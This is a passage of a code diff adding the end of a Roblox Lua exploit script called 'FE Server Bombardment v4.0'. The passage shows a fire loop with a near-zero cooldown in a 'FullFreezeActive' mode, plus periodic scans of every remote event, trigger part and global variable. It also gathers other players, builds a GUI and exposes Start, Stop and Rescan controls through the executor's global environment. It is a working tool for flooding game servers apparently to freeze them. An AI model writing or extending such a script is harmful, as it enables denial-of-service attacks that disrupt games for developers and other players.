+            local cooldown = math.random(20, 40) / 100
+            if Config.FullFreezeActive then
+                cooldown = 0.01
+            end
+            task.wait(cooldown)
+        end
+    end
+end)
+
+-- Stats Refresh Loop
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if GUI.RemoteStat then
+            GUI.UpdateStats()
+        end
+    end
+end)
+
+-- Auto Rescan Loop
+task.spawn(function()
+    while true do
+        task.wait(10)
+        if Config.AutoRescan then
+            ScanAllRemotes()
+            ScanTriggerParts()
+            ScanGlobalEnvironment()
+        end
+    end
+end)
+
+-- Initialization Sequence
+Log("Initializing FE Server Bombardment v4.0 (Universal Deep Ecosystem Build)...")
+ScanAllRemotes()
+ScanTriggerParts()
+ScanGlobalEnvironment()
+GetOtherPlayers()
+GUI.Create()
+GUI.UpdateStats()
+GUI.UpdateStatus()
+
+Services.StarterGui:SetCore("SendNotification", {
+    Title = "✓ Server Bombardment v4.0 Loaded";
+    Text = string.format("%d remotes | %d globals | Ready!", #Cache.AllRemoteEvents, Cache.Stats.GlobalVariablesIndexed);
+    Duration = 4;
+})
+
+Log("Ready! State machine armed and awaiting START activation.")
+
+-- Global Environment API Hooks
+getgenv().ServerBombardment.Start = function()
+    Config.Active = true
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Stop = function()
+    Config.Active = false
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Rescan = function()
+    ScanAllRemotes()
+    ScanTriggerParts()
+    ScanGlobalEnvironment()
+    GetOtherPlayers()
+    GUI.UpdateStats()
+    Log("Full recursive rescan complete!")
+end
+
+getgenv().ServerBombardment.Stats = Cache.Stats
